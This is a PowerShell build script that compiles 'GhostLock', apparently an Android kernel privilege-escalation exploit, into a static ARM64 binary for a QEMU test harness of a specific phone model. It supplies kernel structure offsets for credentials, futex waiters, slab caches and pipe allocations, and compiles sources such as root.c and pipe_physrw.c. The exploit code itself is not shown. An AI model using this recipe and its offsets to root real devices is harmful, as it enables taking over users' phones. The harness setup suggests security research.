# Static (non-PIE) build of GhostLock for the QEMU CPH2521 harness.
# The initramfs has no bionic linker, so the guest binary must be static.
$ErrorActionPreference = "Stop"
$Root = Split-Path -Parent $MyInvocation.MyCommand.Path

$NdkCandidates = @(
  "C:\Users\LENOVO\Downloads\android-ndk-r27d-windows\android-ndk-r27d",
  (Join-Path (Split-Path $Root -Parent) "android-ndk-r27c")
)
$Ndk = $NdkCandidates | Where-Object { Test-Path $_ } | Select-Object -First 1
if (-not $Ndk) { throw "No Android NDK found" }

$Cc = Join-Path $Ndk "toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android35-clang.cmd"
if (-not (Test-Path $Cc)) { throw "NDK clang not found: $Cc" }

Set-Location $Root

$Defs = @(
  '-DTARGET_CONFIG_H=\"target.h\"',
  '-DGHOSTLOCK_KERNEL_5_10=1',
  '-DPSELECT_WAITER_WORD_SHIFT=(0)',
  '-DKIMAGE_TEXT_BASE=0xffffffc008000000ULL',
  '-DMM_STRUCT_SZ=0x3c0',
  '-DMM_ORDER=2',
  '-DKSNITCH_COLLISIONS=8',
  '-DSKB_DATA_DELTA=(-0xe80LL)',
  '-DKERNELSNITCH_IDENTITY_END=0xffffff9000000000ULL',
  '-DWAITER_PI_TREE_ENTRY_OFF=0x18',
  '-DWAITER_TASK_OFF=0x30',
  '-DWAITER_LOCK_OFF=0x38',
  '-DWAITER_PRIO_OFF=0x40',
  '-DWAITER_DEADLINE_OFF=0x48',
  '-DFAKE_WAITER_PI_TREE_ENTRY_OFF=0x18',
  '-DFAKE_WAITER_TASK_OFF=0x30',
  '-DFAKE_WAITER_LOCK_OFF=0x38',
  '-DFAKE_WAITER_PI_TREE_PRIO_OFF=0x40',
  '-DFAKE_WAITER_PI_TREE_DEADLINE_OFF=0x48',
  '-DFAKE_TASK_USAGE_OFF=0x40',
  '-DSTRUCT_SLAB_CACHE_OFF=0x18',
  '-DCRED_UID_OFF=4',
  '-DCRED_SECUREBITS_OFF=0x24',
  '-DCRED_CAPS_OFF=0x28',
  '-DCRED_SECURITY_OFF=0x78',
  '-DKMALLOC_CACHE_TYPES=3',
  '-DKMALLOC_PIPE_INDEX=10',
  '-DKMALLOC_PIPE_OBJ_SIZE=0x400',
  '-DKMALLOC_CGROUP_TYPE=0'
)

$Srcs = @(
  'src/core/main.c','src/core/util.c','src/core/slide.c','src/core/fops.c',
  'src/core/pipe_physrw.c','src/core/root.c','src/core/miniadb.c','src/core/umh_root.c'
)

$Out = "qemu_cph_exploit_static"
if (Test-Path $Out) { Remove-Item $Out -Force }

$Args = @(
  '-O2','-Wall','-Wno-unused-parameter','-Wno-sign-compare','-Wno-unused-function',
  '-Isrc/core','-Isrc/devices'
) + $Defs + @('-static','-pthread','-ldl') + $Srcs + @('-o', $Out)

Write-Host "Building $Out ..."
& $Cc @Args
if ($LASTEXITCODE -ne 0) { throw "compile failed: $LASTEXITCODE" }
Write-Host "OK: $Out ($((Get-Item $Out).Length) bytes)"
Copy-Item (Join-Path $Root $Out) (Join-Path (Split-Path $Root -Parent) "qemu_cph\build\exploit") -Force
Write-Host "copied to qemu_cph\build\exploit"
